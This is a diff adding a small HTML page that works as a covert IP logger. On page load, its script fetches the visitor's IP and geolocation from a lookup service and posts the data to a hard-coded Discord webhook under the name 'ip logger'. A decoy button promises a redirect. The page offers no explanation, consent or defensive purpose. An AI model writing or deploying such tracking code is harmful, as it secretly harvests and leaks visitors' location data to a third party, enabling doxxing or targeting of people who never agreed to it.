@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+        $.getJSON('https://json.geoiplookup.io/?callback=?', function ipLogger(data) {
+  console.log(JSON.stringify(data, null, 2));
+
+
+
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1072495190973087746/JkKYcy2mNZagEiqqXq9WrrsNRmLP61LL0sk0L8JTvSHJxU6rRMI2n5vaIblgknkqh5w0");
+  
+    request.setRequestHeader('Content-type', 'application/json');
+  
+  
+   // theres text for webhook to send
+    // var myText = window.prompt ("what do u want to say by webhook?");
+    // document.getElementById("text").innerHTML = (myText);
+  
+  
+    //theres username for webhook
+    // var myUsername = window.prompt ("what username u wanna give webhook?")
+    // document.getElementById("username").innerHTML = (myUsername)
+    // console.log("username:",myUsername,"has applied")
+  
+  
+  
+  
+    const params = {
+      username:'ip logger',
+      avatar_url:"",
+      content:(JSON.stringify(data, null, 2))
+      
+    }
+    request.send(JSON.stringify(params));
+  
+});
+    </script>
+</head>
+<body>
+    <button onclick="ipLogger(data)">click me to get redirected</button>
+</body>
+</html>
